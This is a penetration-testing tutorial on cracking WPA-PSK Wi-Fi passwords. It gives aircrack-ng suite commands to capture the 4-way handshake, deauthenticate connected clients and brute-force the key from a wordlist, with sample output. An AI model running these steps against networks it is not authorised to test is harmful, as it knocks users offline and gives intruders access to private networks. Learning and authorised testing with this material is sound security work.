# WPA Cracking

## Theory
Wi-Fi Protected Access (WPA) is a security protocol designed to secure wireless networks. WPA-PSK (Pre-Shared Key) relies on a shared password between the client and the AP. However, if an attacker captures the 4-way handshake during the connection process, they can attempt to brute-force the password using a wordlist.

The 4-way handshake is a critical part of the WPA authentication process. It occurs when:
1. A client connects to the AP.
2. The AP and client exchange cryptographic information to establish a secure connection.

If the handshake is captured, the attacker can use tools like `aircrack-ng` or `hashcat` to crack the password.

## Tools Required
- `aircrack-ng` suite
- `hashcat` for GPU-based cracking
- A wireless adapter capable of monitor mode and packet injection

## Steps

### Step 1: Enable Monitor Mode
Enable monitor mode on your wireless interface.

```bash
sudo airmon-ng start wlan0
```

Expected output:
```
Interface   Chipset         Driver
wlan0       Atheros         ath9k - [phy0]
                (monitor mode enabled on wlan0mon)
```

### Step 2: Capture the WPA Handshake
Use `airodump-ng` to capture the handshake. Specify the channel and BSSID of the target AP.

```bash
sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] -w capture wlan0mon
```

- `-c [CHANNEL]`: Channel of the target AP.
- `--bssid [AP_MAC]`: MAC address of the target AP.
- `-w capture`: Save the capture file as `capture.cap`.

Expected output:
```
 CH  6 ][ Elapsed: 2 mins ][ 2023-03-01 12:00
 BSSID              PWR  Beacons  #Data, #/s  CH  MB   ENC  CIPHER  AUTH ESSID
 00:14:6C:7E:40:80  -50      100     50    0   6  54e  WPA2  CCMP    PSK  MyWiFi

 STATION            PWR   Rate   Lost  Frames  Probe
 00:25:9C:CF:1C:9E  -40   36e     0     200   MyWiFi
```

Wait for a client to connect, or force a deauthentication to speed up the process.

### Step 3: Deauthenticate a Client
Force a client to reconnect by sending deauthentication frames.

```bash
sudo aireplay-ng -0 1 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
```

Expected output:
```
Sending 1 deauthentication frame
```

### Step 4: Crack the Handshake
Use `aircrack-ng` to brute-force the password using a wordlist.

```bash
sudo aircrack-ng -w [WORDLIST] -b [AP_MAC] capture.cap
```

- `-w [WORDLIST]`: Path to the wordlist file.
- `-b [AP_MAC]`: MAC address of the target AP.

Expected output:
```
KEY FOUND! [ password123 ]
```

### Notes
- Use a strong wordlist for better chances of success.
- For faster cracking, consider using `hashcat` with GPU acceleration.
- Ensure you have authorization to test the target network.
